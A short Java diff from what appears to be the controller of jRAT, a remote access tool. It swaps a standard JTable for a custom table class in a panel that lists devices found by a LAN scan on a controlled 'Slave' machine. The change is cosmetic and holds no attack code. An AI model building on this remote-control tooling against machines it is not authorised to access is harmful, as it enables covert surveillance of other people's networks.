@@ -17,6 +17,7 @@ import javax.swing.table.DefaultTableModel;
 
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet71LocalNetworkDevices;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.utils.IconUtils;
 
 
@@ -114,7 +115,7 @@ public class PanelControlLANScan extends PanelControlParent {
 					.addContainerGap(16, Short.MAX_VALUE))
 		);
 
-		table = new JTable();
+		table = new DefaultJTable();
 		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Local IP", "Computer/Device name" }));
 		table.setRowHeight(25);
 		table.getColumnModel().getColumn(0).setPreferredWidth(175);
